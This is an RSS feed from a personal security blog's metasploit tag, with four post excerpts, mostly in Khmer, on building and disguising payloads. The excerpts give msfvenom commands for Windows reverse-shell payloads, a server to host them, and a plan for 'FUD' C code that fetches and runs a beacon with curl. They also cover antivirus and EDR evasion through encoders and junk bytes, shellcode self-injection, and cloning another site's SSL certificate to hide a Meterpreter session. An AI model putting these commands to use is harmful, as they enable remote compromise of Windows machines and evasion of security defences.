<?xml version="1.0" encoding="utf-8" standalone="yes" ?>
<rss version="2.0" 
  xmlns:content="http://purl.org/rss/1.0/modules/content/" 
  xmlns:dc="http://purl.org/dc/elements/1.1/" 
  xmlns:atom="http://www.w3.org/2005/Atom" 
  xmlns:sy="http://purl.org/rss/1.0/modules/syndication/" 
  xmlns:media="http://search.yahoo.com/mrss/">
  <channel>
    <title>metasploit on ThikLab - CyberSec</title>
    <link>https://th1k.github.io/en/tags/metasploit/</link>
    <description>Recent content in metasploit on ThikLab - CyberSec</description>
    <generator>Hugo -- gohugo.io</generator>
    <language>en</language>
    <managingEditor>leangputthik@protonmail.com (Thik)</managingEditor>
    <webMaster>leangputthik@protonmail.com (Thik)</webMaster>
    <copyright><a rel='license' target='_blank' href='http://creativecommons.org/licenses/by-sa/4.0/'><img alt='Creative Commons License' style='border-width:0;display:block;margin-left:auto;margin-right:auto;' src='https://i.creativecommons.org/l/by-sa/4.0/88x31.png' /></a>©2020 - 2025 All content is licensed under <a rel='license' target='_blank' href='http://creativecommons.org/licenses/by-sa/4.0/'>CC BY-SA</a>.</copyright>
    <lastBuildDate>Wed, 09 Aug 2023 21:01:06 +0700</lastBuildDate>
    
        <atom:link href="https://th1k.github.io/en/tags/metasploit/index.xml" rel="self" type="application/rss+xml" />
    

      
      <item>
        <title>MSFvenom:- Raw2Shellcode and Remove Garbage</title>
        <link>https://th1k.github.io/en/posts/msfveom-raw2shellcode/</link>
        <pubDate>Wed, 09 Aug 2023 21:01:06 +0700</pubDate>
        <author>leangputthik@protonmail.com (Thik)</author>
        <atom:modified>Wed, 09 Aug 2023 21:01:06 +0700</atom:modified>
        <guid>https://th1k.github.io/en/posts/msfveom-raw2shellcode/</guid>
        <description>ក្នុងអត្ថបទនេះយើងនឹងមកដឹងអំពីវិធីបំប្លែង​ឯកសារ Payload ឫ Beacons ផ្សេងៗដែលជាឯកសារប្រភេទ Raw ឲ្យទៅជា Shellcode ដើម្បីដាក់បញ្ចូលទៅក្នុងភាសារ C ក្នុងការបង្កើតជា Custom Payloads ជំនួសវិញ ។
Shellcode2Raw ខាងក្រោមនេះគឺជាគន្លឹះក្នុងការបំប្លែង Shellcode ទៅជាឯកសារ Raw ។
1  echo -ne &amp;#34;\x68\x62\x69\x3a\x00\x68[...]\x4b\x65\x6e\x6f\x68\x72&amp;#34; &amp;gt; raw.bin   Raw2Shellcode ខាងក្រោមនេះគឺជាគន្លឹះក្នុងការបំប្លែងឯកសារ Raw ទៅជា Shellcode វិញ ។
1  cat raw.bin | msfvenom -p - -a x64 --platform win -e x86/shikata_ga_nai -f c   ពន្យល់អំពី Parameters:-
 -p - ប្រាប់ទៅ msfvenom ឲ្យអានប្រភេទនៃ​ payload របស់ឯកសារចេញពី stdin ដែលបានមកពីការ cat raw.bin -a កំណត់ប្រភេទនៃ architecture (x64/x86) &amp;ndash;platform កំណត់ប្រភេទនែប្រព័ន្ធប្រតិបត្តិការ -e កំណត់ encoder របស់ payload (រំលងបាន) -f កំណត់ប្រភេទនៃ payload ដែលចង់បាន  Raw2Shellcode / Remove Garbage ខាងក្រោមនេះគឺជាគន្លឹះក្នុងការបំប្លែងឯកសារ Raw ទៅជា Shellcode វិញនិងផ្សំជាមួយការដកចេញនៅរាល់ចំនួនមិនបានការដូចជា \x00 ជាដើម ។</description>
        
        <dc:creator>thik</dc:creator>
        <media:content url="https://th1k.github.ioimages/feature3/terminal.gif" medium="image"><media:title type="html">featured image</media:title></media:content>
        
        
        
          
            
              <category>c-shellcode</category>
            
          
            
              <category>metasploit</category>
            
          
        
        
          
            
              <category>MSFvenom</category>
            
          
        
        
          
            
              <category>WinExE</category>
            
          
        
      </item>
      
      <item>
        <title>Evading AV/EDR with Curl Command</title>
        <link>https://th1k.github.io/en/posts/evading-avedr-with-c-curl-command/</link>
        <pubDate>Thu, 29 Jun 2023 21:01:06 +0700</pubDate>
        <author>leangputthik@protonmail.com (Thik)</author>
        <atom:modified>Thu, 29 Jun 2023 21:01:06 +0700</atom:modified>
        <guid>https://th1k.github.io/en/posts/evading-avedr-with-c-curl-command/</guid>
        <description>ខ្លីៗអំពីការ Bypass AV/EDR តាមរយៈពាក្យបញ្ជា Curl ដោយប្រើប្រាស់ភាសា C ។
Generate Payload ខាងក្រោមជាដំណើរការបង្កើត Payload ដោយប្រើប្រាស់ Shellcode ជាឯកសារ Raw គោលដៅលើម៉ាស៊ីន 64 bit ។
បញ្ជាក់៖ Payload នេះដំណើរការតែក្នុងម៉ាស៊ីនវីនដូ ៨/10/11 ឡើងប៉ុណ្ណោះ ។
1  msfvenom -p windows/x64/shell_reverse_tcp lhost=192.168.60.136 lport=4433 -f raw -o cat.bin   Live Payload ក្រោយពីបង្កើត Payload រួចយើងបង្កើត Server ដើម្បីបង្ហោះវាក្នុងគោលបំណងទាញយកមកប្រើប្រាស់វិញនៅជំហ៊ានបន្ទាប់ ។
1  python3 -m http.server -d payloadDir 8000   PWN The Code តស់ចាប់ផ្ដើមបង្កើត FUD Payload ដោយប្រើប្រាស់ពាក្យបញ្ជា Curl ក្នុងភាសារ C ដើម្បីទាញយក Beacon និងបើកដំណើរការពីចំងាយ ។</description>
        
        <dc:creator>thik</dc:creator>
        <media:content url="https://th1k.github.ioimages/feature3/terminal.gif" medium="image"><media:title type="html">featured image</media:title></media:content>
        
        
        
          
            
              <category>c-shellcode</category>
            
          
            
              <category>metasploit</category>
            
          
        
        
          
            
              <category>Evading</category>
            
          
        
        
          
            
              <category>WinExE</category>
            
          
        
      </item>
      
      <item>
        <title>Evading AV/EDR with Junk Bytes</title>
        <link>https://th1k.github.io/en/posts/evading-avedr-with-junk-bytes/</link>
        <pubDate>Tue, 27 Jun 2023 21:01:06 +0700</pubDate>
        <author>leangputthik@protonmail.com (Thik)</author>
        <atom:modified>Tue, 27 Jun 2023 21:01:06 +0700</atom:modified>
        <guid>https://th1k.github.io/en/posts/evading-avedr-with-junk-bytes/</guid>
        <description>ខ្លះៗអំពីការ Bypass AV/EDR តាមរយៈ Msfvenom ។
Generate Payload ខាងក្រោមជាដំណើរការបង្កើត Payload ដោយប្រើប្រាស់ Shellcode ជាភាសារ C គោលដៅលើម៉ាស៊ីន 64 bit និងបានថែមនូវពាក្យបញ្ជា -n ក្នុងន័យបង្កើតចំនួន Bytes ដែលមិនបានការដើម្បីព្យាយាមបង្វៀងពីការចាប់របស់ AV ។
1  msfvenom -p windows/x64/shell_reverse_tcp lhost=192.168.60.136 lport=4433 -f c -n 10000   ចំណាំ៖ ក្រោយ -n យើងអាចដាក់ចំនួនលេខកាន់តែច្រើនគឺមានលទ្ធភាពក្នុងការ Bypass បានកាន់តែច្រើន ។
បន្ទាប់មកយើងនឹង Compile Payload ធម្មតាដោយប្រើប្រាស់វិធីសាស្ត្រ Process Injection តាមបែប Slef-Injection ដោយផ្ដល់សិទ្ធតាមលំនាំដើម Read, Write និង Execute ។
1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16  #include &amp;lt;stdio.</description>
        
        <dc:creator>thik</dc:creator>
        <media:content url="https://th1k.github.ioimages/feature3/terminal.gif" medium="image"><media:title type="html">featured image</media:title></media:content>
        
        
        
          
            
              <category>c-shellcode</category>
            
          
            
              <category>metasploit</category>
            
          
        
        
          
            
              <category>Evading</category>
            
          
        
        
          
            
              <category>WinExE</category>
            
          
        
      </item>
      
      <item>
        <title>Impersonate SSL - MSF Bypass Detection</title>
        <link>https://th1k.github.io/en/posts/bypass-detection-msf-shell/</link>
        <pubDate>Sat, 03 Dec 2022 21:01:06 +0700</pubDate>
        <author>leangputthik@protonmail.com (Thik)</author>
        <atom:modified>Sat, 03 Dec 2022 21:01:06 +0700</atom:modified>
        <guid>https://th1k.github.io/en/posts/bypass-detection-msf-shell/</guid>
        <description>Clone SSL Certification តើអ្នកដឹងទេថា យើងអាចធ្វើការថតចម្លងនូវរាល់ឯកសារ SSL Certificate របស់គេហទំព័រដទៃបាន ដោយប្រើប្រាស់ Module មួយនៅក្នុង Metasploit Framework ដែលត្រូវបានបង្កើតឡើងដោយលោក Chris John Riley ។ ឯកសារដែលត្រូវបានថតចម្លងនោះ នឹងត្រូវរក្សាទុកជាប្រភេទទម្រង់ឯកសារ PEM ហើយវាក៏អាចប្រើប្រាស់បានគ្រប់ប្រភេទ Modules នៅក្នុង Metasploit ផងដែរ។
ដើម្បីថតចម្លង យើងអាចប្រើប្រាស់ពាក្យបញ្ជាដូចខាងក្រោម៖
1 2 3  use auxiliary/gather/impersonate_ssl set rhosts https://example.com/ exploit   ដូចដែលរូបបានបង្ហាញខាងលើ គឺយើងបានថតចម្លងឯកសារ Certificate បានសម្រេច។
Meterpreter Using SSL Connection ខាងក្រោមនេះគឺជាការសាកល្បងប្រើប្រាស់ SSL Certificate ដែលបានថតចម្លងនោះមកភ្ជាប់ទំនាក់ទំងរវាង Attacker PC និង Victim PC ដោយប្រើប្រាស់ Reverse Shell ជាប្រភេទ HTTPS ។
បើកចូលផ្ទាំង Terminal នៃ Metasploit Framework រួចបញ្ចូលពាក្យបញ្ជាដូចខាងក្រោម៖
1 2 3 4 5 6 7  use exploit/multi/handler set payload windows/x64/meterpreter/reverse_https set lhost 192.</description>
        
        <dc:creator>thik</dc:creator>
        <media:content url="https://th1k.github.ioimages/feature2/article-1.png" medium="image"><media:title type="html">featured image</media:title></media:content>
        
        
        
          
            
              <category>metasploit</category>
            
          
            
              <category>ssl</category>
            
          
            
              <category>bypass</category>
            
          
        
        
          
            
              <category>CA</category>
            
          
        
        
          
            
              <category>WinExE</category>
            
          
        
      </item>
      

    
  </channel>
</rss>
